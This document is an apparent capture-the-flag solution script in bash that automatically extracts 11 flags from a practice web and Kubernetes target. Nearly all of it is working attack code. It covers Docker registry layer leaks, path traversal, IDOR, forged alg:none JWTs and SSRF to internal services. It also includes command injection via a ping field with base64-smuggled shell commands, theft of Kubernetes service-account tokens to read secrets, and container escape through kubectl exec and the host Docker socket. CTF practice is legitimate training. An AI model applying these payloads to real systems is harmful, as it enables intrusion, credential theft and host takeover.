#!/usr/bin/env bash
# run every PoC and print all 11 flags in one go.
# Target: https://ctf.seoeh.ir
# Usage:  bash extract.sh
# Requires: curl, python3, base64, tar, grep

set -u
BASE="https://ctf.seoeh.ir"
REG="https://hub.hamdocker.ir"

found() { grep -aoE 'HAMAMOOZ\{[^}]*\}' | head -1; }
b64()   { printf '%s' "$1" | base64 | tr -d '\n'; }

# ---- helpers -------------------------------------------------------------
ping_rce() {
  local inner="$1" b
  b=$(b64 "$inner")
  curl -sk -m 90 -X POST "$BASE/api/diag/ping" -H 'Content-Type: application/json' \
    -d "{\"host\":\"127.0.0.1; echo $b | base64 -d | sh\"}" 2>/dev/null \
  | python3 -c 'import json,sys
import contextlib,io
try:
  print(json.load(sys.stdin).get("output",""))
except Exception: pass' 2>/dev/null
}

ssrf() {
  curl -sk -m 40 -X POST "$BASE/api/webhooks/test" -H 'Content-Type: application/json' \
    -d "{\"url\":\"$1\",\"method\":\"${2:-GET}\",\"headers\":${3:-{}}}" 2>/dev/null
}

echo "[*] Target: $BASE"
ok=0
for n in 1 2 3 4 5 6 7 8; do
  curl -sk -m 15 -o /dev/null "$BASE/robots.txt" 2>/dev/null && { ok=1; break; }
  echo "[!] not reachable yet, retrying ($n)..."; sleep 6
  done
[ "$ok" = 1 ] || { echo "[!] target unreachable"; exit 1; }
echo "[*] target reachable"

# ================= F1 — Docker layer leak (hub registry) =================
echo "[*] F1 (docker layer leak)"
F1TOK=$(curl -sk -m 20 "$REG/v2/token?service=harbor-registry&scope=repository:seoeh/hamamooz_challlenges:pull" \
        | python3 -c 'import json,sys;print(json.load(sys.stdin)["token"])' 2>/dev/null)
curl -sk -m 60 -H "Authorization: Bearer $F1TOK" \
  "$REG/v2/seoeh/hamamooz_challlenges/blobs/sha256:cad298f9538d92ea9901f8de6c41611a63d62c56e914c9bd802ff01080456041" \
  -o /tmp/f1_layer.tar.gz 2>/dev/null
F1=$(tar xzf /tmp/f1_layer.tar.gz -O app/.env 2>/dev/null | found)
echo "F1: ${F1:-FAIL}"

# ================= F2 — Exposed Swagger schema ============================
echo "[*] F2 (swagger)"
F2=$(curl -sk -m 30 "$BASE/api/schema/" | found)
echo "F2: ${F2:-FAIL}"

# ================= F3 — Debug header on internal flag endpoint ============
echo "[*] F3 (debug header)"
F3=$(curl -sk -m 30 -H "X-Debug-Mode: true" "$BASE/api/internal/flag" | found)
echo "F3: ${F3:-FAIL}"

# ================= F4 — Path traversal ====================================
echo "[*] F4 (path traversal)"
F4=$(curl -sk -m 30 "$BASE/api/reports/download?file=../flag.txt" | found)
echo "F4: ${F4:-FAIL}"

# ================= F5 — IDOR ==============================================
echo "[*] F5 (IDOR)"
F5=$(curl -sk -m 30 "$BASE/api/orgs/2/reports/2" | found)
echo "F5: ${F5:-FAIL}"

# ================= F6 — JWT alg:none ======================================
echo "[*] F6 (JWT alg:none)"
JWT=$(python3 - <<'EOF'
import base64,json
def b(d): return base64.urlsafe_b64encode(json.dumps(d,separators=(',',':')).encode()).rstrip(b'=').decode()
print(b({"alg":"none","typ":"JWT"})+"."+b({"sub":"1","role":"admin"})+".")
EOF
)
F6=$(curl -sk -m 30 -H "Authorization: Bearer $JWT" "$BASE/admin/dashboard" | found)
echo "F6: ${F6:-FAIL}"

# ================= F7 — SSRF to internal admin-panel ======================
echo "[*] F7 (SSRF admin-panel)"
F7=$(ssrf "http://admin-panel.internal-tools.svc.cluster.local/" | found)
echo "F7: ${F7:-FAIL}"

# ================= F9 — Command injection =================================
echo "[*] F9 (RCE via ping)"
F9=$(ping_rce 'cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt' | found)
echo "F9: ${F9:-FAIL}"

# ================= F8 — SA token -> k8s secret ============================
echo "[*] F8 (k8s secret via leaked token)"
F8=$(ping_rce 'python3 - <<"PY"
import urllib.request,json,base64,ssl
ctx=ssl._create_unverified_context()
tok=open("/var/run/secrets/kubernetes.io/serviceaccount/token").read().strip()
req=urllib.request.Request("https://kubernetes.default.svc/api/v1/secrets",headers={"Authorization":"Bearer "+tok})
d=json.load(urllib.request.urlopen(req,context=ctx,timeout=10))
for it in d["items"]:
    if "flag" in (it.get("data") or {}):
        print(base64.b64decode(it["data"]["flag"]).decode())
PY' | found)
echo "F8: ${F8:-FAIL}"

# ================= F10 — Privileged pod escape ============================
echo "[*] F10 (pod escape via kubectl)"
F10=$(ping_rce 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); kubectl --server=https://kubernetes.default.svc --token=$TOKEN --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt exec -n escape-zone legacy-worker -- cat /host/var/lib/node-data/flag.txt' | found)
echo "F10: ${F10:-FAIL}"

# ================= F11 — Docker socket escape -> VM host =================
echo "[*] F11 (docker socket escape)"
PAYLOAD='{"Image":"ctf/backend:latest","User":"0","HostConfig":{"Binds":["/:/host"]},"Cmd":["sh","-c","cat /host/home/ubuntu/flag.txt"]}'
PB64=$(b64 "$PAYLOAD")
DOCKER="S=/host/run/docker.sock
echo $PB64 | base64 -d > /tmp/p.json
CID=\$(curl -s --max-time 6 --unix-socket \$S -X POST http://localhost/containers/create -H 'Content-Type: application/json' -d @/tmp/p.json | sed -n 's/.*\"Id\":\"\([a-f0-9]*\)\".*/\1/p')
curl -s --max-time 6 --unix-socket \$S -X POST http://localhost/containers/\$CID/start -H 'Content-Type: application/json' -d '{}' >/dev/null
sleep 1
curl -s --max-time 10 --unix-socket \$S http://localhost/containers/\$CID/logs?stdout=1\&stderr=1
curl -s --max-time 6 --unix-socket \$S -X DELETE http://localhost/containers/\$CID?force=1 >/dev/null"
DB64=$(b64 "$DOCKER")
F11=$(ping_rce "TOKEN=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); kubectl --server=https://kubernetes.default.svc --token=\$TOKEN --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt exec -n escape-zone legacy-worker -- sh -c 'echo $DB64 | base64 -d | sh'" | found)
echo "F11: ${F11:-FAIL}"

# ================= Summary ================================================
echo
echo "================================"
echo "         ALL FLAGS"
echo "================================"
for i in F1 F2 F3 F4 F5 F6 F7 F8 F9 F10 F11; do
  v=$(eval echo \$$i)
  printf "%-4s %s\n" "$i" "${v:-FAIL}"
done
